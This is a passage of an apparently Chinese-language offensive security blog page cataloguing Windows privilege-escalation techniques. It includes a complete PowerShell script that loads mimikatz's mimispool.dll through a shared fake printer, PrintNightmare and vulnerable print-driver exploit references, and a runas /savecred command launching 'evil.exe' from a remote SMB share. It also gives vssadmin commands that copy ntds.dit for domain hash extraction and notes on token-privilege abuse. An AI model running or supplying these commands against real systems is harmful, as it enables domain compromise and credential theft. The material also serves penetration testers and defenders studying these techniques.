  <li><a href="http://uuzdaisuki.com/2021/06/09/AlwaysInstallElevated%E6%8F%90%E6%9D%83/#AlwaysInstallElevated%E6%8F%90%E6%9D%83">AlwaysInstallElevated提权</a></li>
  <li><a href="https://www.cnblogs.com/JFSec/articles/17322189.html">本地侦擦与提权 - JFSec - 博客园</a></li>
</ul>

<h2 id="利用存在漏洞的驱动提权">利用存在漏洞的驱动提权</h2>
<p>条件：</p>
<ul>
  <li>漏洞</li>
  <li>存在漏洞的驱动</li>
</ul>

<p>查看驱动：</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Swissky</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">driverquery.exe</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">table</span><span class="w"> </span><span class="nx">/si</span><span class="w">
</span><span class="kr">Module</span><span class="w"> </span><span class="n">Name</span><span class="w">  </span><span class="nx">Display</span><span class="w"> </span><span class="nx">Name</span><span class="w">           </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Type</span><span class="w">   </span><span class="nx">Link</span><span class="w"> </span><span class="nx">Date</span><span class="w">
</span><span class="o">============</span><span class="w"> </span><span class="o">======================</span><span class="w"> </span><span class="o">=============</span><span class="w"> </span><span class="o">======================</span><span class="w">
</span><span class="mi">1394</span><span class="n">ohci</span><span class="w">     </span><span class="nx">1394</span><span class="w"> </span><span class="nx">OHCI</span><span class="w"> </span><span class="nx">Compliant</span><span class="w"> </span><span class="nx">Ho</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/10/2006</span><span class="w"> </span><span class="nx">4:44:38</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="mi">3</span><span class="n">ware</span><span class="w">        </span><span class="nx">3ware</span><span class="w">                  </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">5/18/2015</span><span class="w"> </span><span class="nx">6:28:03</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">ACPI</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Driver</span><span class="w">  </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/9/1975</span><span class="w"> </span><span class="nx">6:17:08</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">AcpiDev</span><span class="w">      </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Devices</span><span class="w"> </span><span class="nx">driver</span><span class="w">    </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/7/1993</span><span class="w"> </span><span class="nx">6:22:19</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">acpiex</span><span class="w">       </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">ACPIEx</span><span class="w"> </span><span class="nx">Drive</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">3/1/2087</span><span class="w"> </span><span class="nx">8:53:50</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">acpipagr</span><span class="w">     </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Processor</span><span class="w"> </span><span class="nx">Aggrega</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">1/24/2081</span><span class="w"> </span><span class="nx">8:36:36</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">AcpiPmi</span><span class="w">      </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Power</span><span class="w"> </span><span class="nx">Meter</span><span class="w"> </span><span class="nx">Drive</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">11/19/2006</span><span class="w"> </span><span class="nx">9:20:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">acpitime</span><span class="w">     </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Wake</span><span class="w"> </span><span class="nx">Alarm</span><span class="w"> </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">2/9/1974</span><span class="w"> </span><span class="nx">7:10:30</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">ADP80XX</span><span class="w">      </span><span class="nx">ADP80XX</span><span class="w">                </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">4/9/2015</span><span class="w"> </span><span class="nx">4:49:48</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>
<p>对比存在漏洞的驱动：</p>
<ul>
  <li><a href="https://www.loldrivers.io/">LOLDrivers</a></li>
</ul>

<h2 id="利用打印机提权">利用打印机提权</h2>
<h3 id="将-mimikatz-添加为虚拟打印机">将 mimikatz 添加为虚拟打印机</h3>
<p>Create a Printer</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$printerName</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="s1">'Universal Priv Printer'</span><span class="w">
</span><span class="nv">$system32</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">systemroot</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\system32'</span><span class="w">
</span><span class="nv">$drivers</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\spool\drivers'</span><span class="w">
</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$printerName</span><span class="w">
 
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\mscms.dll'</span><span class="p">)</span><span class="w">             </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\mimispool.dll'</span><span class="p">)</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'.\mimikatz_trunk\x64\mimispool.dll'</span><span class="w">   </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$drivers</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="s1">'\x64\3\mimispool.dll'</span><span class="p">)</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'.\mimikatz_trunk\win32\mimispool.dll'</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$drivers</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="s1">'\W32X86\3\mimispool.dll'</span><span class="p">)</span><span class="w">
 
</span><span class="n">Add-PrinterDriver</span><span class="w"> </span><span class="nt">-Name</span><span class="w">       </span><span class="s1">'Generic / Text Only'</span><span class="w">
</span><span class="n">Add-Printer</span><span class="w">       </span><span class="nt">-DriverName</span><span class="w"> </span><span class="s1">'Generic / Text Only'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$printerName</span><span class="w"> </span><span class="nt">-PortName</span><span class="w"> </span><span class="s1">'FILE:'</span><span class="w"> </span><span class="nt">-Shared</span><span class="w">
 
</span><span class="n">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles'</span><span class="p">)</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'x64\3'</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="s1">'mimispool.dll'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mscms.dll'</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'W32X86\3'</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="s1">'mimispool.dll'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mscms.dll'</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="bp">$null</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="bp">$null</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mimispool.dll'</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span></code></pre></div></div>
<p>Execute the driver</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$serverName</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s1">'dc.purple.lab'</span><span class="w">
</span><span class="nv">$printerName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Universal Priv Printer'</span><span class="w">
</span><span class="nv">$fullprinterName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'\\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$serverName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$printerName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">' - '</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="kr">If</span><span class="w"> </span><span class="p">([</span><span class="n">System.Environment</span><span class="p">]::</span><span class="n">Is64BitOperatingSystem</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="s1">'x64'</span><span class="p">}</span><span class="w"> </span><span class="kr">Else</span><span class="w"> </span><span class="p">{</span><span class="s1">'x86'</span><span class="p">})</span><span class="w">
</span><span class="n">Remove-Printer</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$fullprinterName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span><span class="n">Add-Printer</span><span class="w"> </span><span class="nt">-ConnectionName</span><span class="w"> </span><span class="nv">$fullprinterName</span><span class="w">
</span></code></pre></div></div>
<h3 id="printernightmare">PrinterNightmare</h3>
<p>漏洞CVE编号：CVE-2021-1675。未经身份验证的远程攻击者可利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。建议受影响用户及时更新漏洞补丁进行防护，做好资产自查以及预防工作，以免遭受黑客攻击。</p>

<p><strong>影响范围</strong></p>

<p>Windows Server 2012 R2 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 (Server Core installation)
Windows Server 2012
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows RT 8.1
Windows 8.1 for x64-based systems
Windows 8.1 for 32-bit systems
Windows 7 for x64-based Systems Service Pack 1
Windows 7 for 32-bit Systems Service Pack 1
Windows Server 2016 (Server Core installation)
Windows Server 2016
Windows 10 Version 1607 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 for 32-bit Systems
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
Windows 10 Version 21H1 for 32-bit Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems</p>

<ul>
  <li><a href="https://github.com/cube0x0/CVE-2021-1675">cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527</a></li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[〖EXP〗Ladon打印机漏洞提权CVE-2021-1675复现</td>
          <td>K8哥哥’s Blog](https://k8gege.org/p/CVE-2021-1675.html)</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<h3 id="bring-your-own-vulnerability">Bring Your Own Vulnerability</h3>
<p>windows 允许低权限用户安装打印机驱动，因此我们可以自行安装带有漏洞的驱动程序，然后通过这些驱动程序的漏洞提权到 SYSTEM。</p>

<p>Concealed Position : https://github.com/jacob-baines/concealed_position</p>
<ul>
  <li>ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE</li>
  <li>RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE</li>
  <li>POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE</li>
  <li>SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE</li>
</ul>

<p>利用 exp：</p>
<ul>
  <li><a href="https://github.com/jacob-baines/concealed_position">jacob-baines/concealed_position: Bring your own print driver privilege escalation tool</a></li>
</ul>

<h2 id="利用-runas-命令提权或降权">利用 RunAS 命令提权或降权</h2>
<p>RunAS 命令使用场景：</p>
<ol>
  <li>权限不够读不到帐密或 HASH 的情况下，验证用户是否使用某个已保存的密码，使用该已保存的密码可实现提权</li>
  <li>SYSTEM 权限降权到某个用户进行操作时，例如切换到特定的用户，读取对应的浏览器记录、或者获取特定用户的 shell 等。</li>
</ol>

<p>枚举保存的密码：</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cmdkey</span> <span class="na">/list
</span><span class="kd">Currently</span> <span class="kd">stored</span> <span class="kd">credentials</span>:
    <span class="kd">Target</span>: <span class="kd">Domain</span><span class="nl">:interactive</span><span class="o">=</span><span class="kd">WORKGROUP</span>\Administrator
    <span class="kd">Type</span>: <span class="kd">Domain</span> <span class="kd">Password</span>
    <span class="kd">User</span>: <span class="kd">WORKGROUP</span>\Administrator
</code></pre></div></div>
<p>使用保存的凭证连接远程 SMB 或者直接运行命令：</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">runas</span> <span class="na">/savecred /user</span><span class="nl">:WORKGROUP</span>\Administrator <span class="s2">"\\10.XXX.XXX.XXX\SHARE\evil.exe"</span>
<span class="nb">runas</span> <span class="na">/savecred /user</span><span class="nl">:Administrator</span> <span class="s2">"cmd.exe /k whoami"</span>
</code></pre></div></div>

<p>其他利用：</p>

<ul>
  <li><a href="http://k8gege.org/Ladon/runas.html">〖教程〗Ladon非交互式runas执行命令/反弹SHELL </a>
    <blockquote>
      <p>系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。</p>
    </blockquote>
  </li>
</ul>

<h2 id="利用-shadow-copies-提权域控">利用 Shadow Copies 提权（域控）</h2>
<p>该利用方式一般用于从域控中获取 ntds.dit 文件（活动目录中的所有数据都保存在该文件中）。</p>

<p>获取卷影位置：</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List shadow copies using vssadmin (Needs Admnistrator Access)</span><span class="w">
</span><span class="n">vssadmin</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">shadows</span><span class="w">
  
</span><span class="c"># List shadow copies using diskshadow</span><span class="w">
</span><span class="n">diskshadow</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">shadows</span><span class="w"> </span><span class="nx">all</span><span class="w">

</span></code></pre></div></div>

<p>创建软链接以便查看。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Make a symlink to the shadow copy and access </span><span class="w">
</span><span class="n">mklink</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">c:\shadowcopy</span><span class="w"> </span><span class="nx">\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span><span class="w">
</span></code></pre></div></div>

<p>或者创建一个卷影拷贝，然后复制出来</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vssadmin</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">/for</span><span class="o">=</span><span class="n">c:</span><span class="w">
</span><span class="nx">copy</span><span class="w"> </span><span class="nx">\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit</span><span class="w"> </span><span class="nx">c:\ntds.dit</span><span class="w">
</span></code></pre></div></div>

<p>获取到 ntds 后，可以想办法获取其中的散列值。</p>
<ul>
  <li>Impacket 中的 Secretsdump</li>
  <li>msf 中的 Psexec_ntdsgrab 模块</li>
  <li>msf 中 Meterpreter会话 + windows/gather/credentials/domain_hashdump</li>
</ul>

<p><strong>参考资料</strong>：</p>
<ul>
  <li><a href="https://zhuanlan.zhihu.com/p/441167567">域控安全之域渗透 - 知乎</a></li>
</ul>

<h2 id="利用-psexec-提权win2003--win2008">利用 PsExec 提权(Win2003 &amp; Win2008)</h2>
<p>PsExec 是 windows 内核套件 SysInternalSuite 中的一个工具，可以从 Administrator 提权到 SYSTEM</p>

<p>下载地址:<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/">Sysinternals Utilities - Sysinternals | Microsoft Learn</a></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PsExec -i -s cmd
</code></pre></div></div>

<p>参考</p>
<ul>
  <li><a href="https://github.com/SexyBeast233/SecBooks/blob/main/%E3%80%90%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E3%80%91bypass/%E5%AE%9E%E6%88%98%E9%81%87%E8%A7%81%E5%88%B0%E7%9A%84%E5%A5%BD%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E9%9B%86%E5%90%88.md">SecBooks/【公众号文章】bypass/实战遇见到的好用提权方法集合.md at main · SexyBeast233/SecBooks</a></li>
</ul>

<h2 id="利用-windows-自带文件脚本提权">利用 Windows 自带文件、脚本提权</h2>
<p>Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/</p>

<h2 id="滥用-token-提权">滥用 Token 提权</h2>
<p>条件：</p>
<ul>
  <li>已经拿到非管理员权限的服务帐户</li>
</ul>

<p>效果：</p>
<ul>
  <li>提权至 SYSTEM</li>
</ul>

<h3 id="背景知识">背景知识</h3>

<hr />
<p>当用户登录时，系统会创建一个访问令牌。用户执行的每个进程都有该访问令牌的副本。令牌标识了用户、用户的组、用户的权限以及SID（安全标识符）。</p>

<p>当本地管理员登录时，系统会创建两个访问令牌：一个具有管理员权限，另一个具有普通权限。默认情况下，当该用户执行进程时，将使用具有常规（非管理员）权限的进程。当此用户尝试以管理员身份执行任何操作（例如“以管理员身份运行”）时，将使用 UAC 来请求权限。</p>

<p>使用 whoami /priv 可以查看当前用户的权限。拥有下面权限时可考虑使用这种方式：</p>
<ul>
  <li>iis sqlserver 的用户通常具有 SeImpersonatePrivilege 和 SeAssignPrimaryPrivilege 权限。</li>
  <li>服务用户通常拥有 SeBackupPrivilege 和 SeRestorePrivilege 权限。</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    SeIncreaseQuotaPrivilege: DISABLED
    SeShutdownPrivilege: DISABLED
    SeAuditPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
</code></pre></div></div>

<p><strong>不同的几种权限可能会用于不同的攻击场景</strong></p>

<p><strong>1. SeImpersonatePrivilege</strong>
任何拥有此权限的进程都可以模拟（但不能创建）它能够处理的任何令牌。  您可以从 Windows 服务 (DCOM) 获取特权令牌，使其针对该漏洞执行 NTLM 身份验证，然后以 SYSTEM 身份执行进程。</p>

<p>利用方法：</p>
<ol>
  <li>
    <p>使用 NTLM relay 到本地协商获得系统用户的 token。</p>
  </li>
  <li>
    <p>可以使用开源工具烂土豆、孤独土豆或多汁土豆。</p>
  </li>
  <li>
    <p>通过WinAPI CreateProcessWithToken创建一个新的进程，传入系统用户的令牌。</p>
  </li>
</ol>

<p>只有具有SeImpersonatePrivilege权限才能成功创建。</p>

<p><strong>2. SeAssignPrimaryPrivilege</strong>
它与 SeImpersonatePrivilege 非常相似，它将使用相同的方法来获取特权令牌。
然后，此权限允许将主令牌分配给新的/挂起的进程。<br />
使用特权模拟令牌，您可以派生主令牌 (DuplicateTokenEx)。有了令牌，您可以使用“CreateProcessAsUser”创建一个新进程，或者创建一个挂起的进程并设置令牌（通常，您不能修改正在运行的进程的主令牌）。</p>

<p>利用方法：</p>
<ul>
  <li>利用 NTLM Relay 到当地谈判获得系统用户的 token</li>
  <li>通过 WinAPI CreateProcessAsUser 创建新进程，传入系统用户的 token，该 token 具有系统权限。</li>
</ul>

<p><strong>3. SeBackupPrivilege</strong>
此权限使系统授予对任何文件的所有读取访问控制（仅限读取）。使用它从注册表中读取本地管理员帐户的密码哈希值，然后将“psexec”或“wmicexec”与哈希值 (PTH) 结合使用。</p>

<p>如果本地管理员被禁用，或者配置为本地管理员在远程连接时不是管理员，则此攻击将不起作用。</p>

<p>攻击场景：收集</p>

<p><strong>4. SeRestorePrivilege</strong>
对系统上任何文件的写入访问控制，无论文件 ACL 为何。你可以修改服务、DLL劫持、设置调试器（图像文件执行选项）……很多选项可以升级</p>
<blockquote>
  <p>攻击场景：持久化；防御规避</p>
</blockquote>

<p><strong>5. SeCreateTokenPrivilege</strong>
仅当用户可以模拟令牌（即使没有 SeImpersonatePrivilege）时，此令牌才可以用作 EoP 方法。
在可能的情况下，如果令牌针对同一用户并且完整性级别小于或等于当前进程完整性级别，则用户可以模拟令牌。在这种情况下，用户可以创建一个模拟令牌并向其添加特权组 SID。</p>
<blockquote>
  <p>攻击方式：提权</p>
</blockquote>

<p><strong>6. SeLoadDriverPrivilege</strong>
加载和卸载设备驱动程序。</p>
<blockquote>
  <p>攻击方式：持久化；防御规避</p>
</blockquote>

<p><strong>7. SeTakeOwnershipPrivilege</strong>
此权限与 SeRestorePrivilege 非常相似。它允许进程通过授予 WRITE_OWNER 访问权限来“获得对象的所有权，而无需授予任意访问权限”。首先，您必须获得要写入的注册表项的所有权并修改 DACL，以便可以在其上写入。</p>
<blockquote>
  <p>攻击场景：持久化；防御规避；收集</p>
</blockquote>

<p><strong>8. SeDebugPrivilege</strong>
它允许持有者调试另一个进程，这包括读取和写入该进程的内存。有许多不同的内存注入策略可以与此特权一起使用，从而规避大多数 AV/HIPS 解决方案。</p>
<blockquote>
